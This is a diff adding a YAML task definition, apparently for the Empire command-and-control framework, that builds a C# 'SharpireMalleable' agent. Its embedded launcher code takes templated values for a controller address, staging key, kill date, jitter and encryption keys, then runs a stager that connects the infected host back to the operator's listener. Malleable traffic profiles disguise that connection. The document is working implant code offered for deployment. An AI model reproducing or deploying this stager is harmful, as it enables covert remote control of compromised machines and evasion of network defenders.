@@ -1,0 +1,109 @@
+- Name: SharpireMalleable
+  Aliases: []
+  Description: CSharp empire agents with malleable profile interpreter — only used
+    by the http_malleable listener. Base Sharpire ships without the malleable types,
+    keeping plain-http builds smaller and dropping the System.Web.Extensions (JavaScriptSerializer)
+    dependency.
+  Author:
+    Name: Jake Krasnov
+    Handle: _Hubbl3
+    Link: https://twitter.com/_Hubbl3
+  Help:
+  Language: CSharp
+  CompatibleDotNetVersions:
+    - Net40
+    - Net45
+  Code: |
+    using System;
+
+    using Sharpire;
+
+    public static class Program
+    {
+        // Force EmpireCompiler's tree-pruning optimizer to retain the malleable
+        // type definitions in SharpireMalleable/. The optimizer walks used
+        // types from this entrypoint, but SessionInfo/Coms/EmpireStager are
+        // partial classes split across the Sharpire base + SharpireMalleable
+        // extension directories. Because ITypeSymbol.DeclaringSyntaxReferences
+        // .FirstOrDefault() only follows ONE declaration per partial type, the
+        // optimizer may never visit the extension's syntax trees and drop
+        // MalleableProfile.cs / MalleableTransform.cs from the second compile
+        // pass — causing "type not found" errors inside Empire.Agent.Malleable.cs.
+        // These static typeof() references give the optimizer direct syntactic
+        // anchors into both files.
+        private static readonly Type[] _keepMalleableTypes =
+        {
+            typeof(MalleableProfile),
+            typeof(MalleableTransform)
+        };
+
+        public static void Main()
+        {
+            try
+            {
+              string address = "{{ REPLACE_ADDRESS }}";
+              string stagingkey = "{{ REPLACE_STAGINGKEY }}";
+              string workinghours = "{{ REPLACE_WORKINGHOURS }}";
+              string profile = "{{ REPLACE_PROFILE }}";
+              string malleableProfileB64 = "{{ REPLACE_MALLEABLE_PROFILE }}";
+              string killdate = "{{ REPLACE_KILLDATE }}";
+              uint delay = {{ REPLACE_DELAY }};
+              double jitter = {{ REPLACE_JITTER }};
+              uint lostlimit = {{ REPLACE_LOSTLIMIT }};
+              string agentlanguage = "dotnet";
+              string defaultResponse = "{{ REPLACE_DEFAULTRESPONSE}}";
+              string[] arguments = { address, stagingkey, agentlanguage};
+              byte[] skbytes = new byte[] { {{ agent_private_cert_key }} };
+              byte[] pk = new byte[] { {{ agent_public_cert_key }} };
+
+              SessionInfo sessionInfo = new SessionInfo(arguments);
+              sessionInfo.SetWorkingHours(workinghours);
+              sessionInfo.SetKillDate(killdate);
+              sessionInfo.SetDefaultJitter(jitter);
+              sessionInfo.SetDefaultDelay(delay);
+              sessionInfo.SetDefaultLostLimit(lostlimit);
+              sessionInfo.SetDefaultResponse(defaultResponse);
+              sessionInfo.SetProfile(profile);
+              sessionInfo.SetMalleableProfile(malleableProfileB64);
+              sessionInfo.SetPrivateKeyBytes(skbytes);
+              sessionInfo.SetPublicKeyBytes(pk);
+
+              (new EmpireStager(sessionInfo)).Execute();
+            }
+            catch (Exception e) { Console.WriteLine( e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace); }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries:
+    - Name: Sharpire
+      Description: Base Sharpire library (partial classes — receive malleable extensions
+        from the SharpireMalleable library).
+      Location: Sharpire\Sharpire\
+      Language: CSharp
+      CompatibleDotNetVersions:
+        - Net40
+        - Net45
+      ReferenceAssemblies: []
+      EmbeddedResources: []
+    - Name: SharpireMalleable
+      Description: Malleable-profile interpreter (parser, transform engine, terminator
+        helpers, and partial-class extensions that fill in the hooks declared in
+        base Sharpire).
+      Location: Sharpire\SharpireMalleable\
+      Language: CSharp
+      CompatibleDotNetVersions:
+        - Net40
+        - Net45
+      ReferenceAssemblies:
+        - Name: System.Web.Extensions.dll
+          Location: net40\System.Web.Extensions.dll
+          DotNetVersion: Net40
+        - Name: System.Web.Extensions.dll
+          Location: net45\System.Web.Extensions.dll
+          DotNetVersion: Net45
+      EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
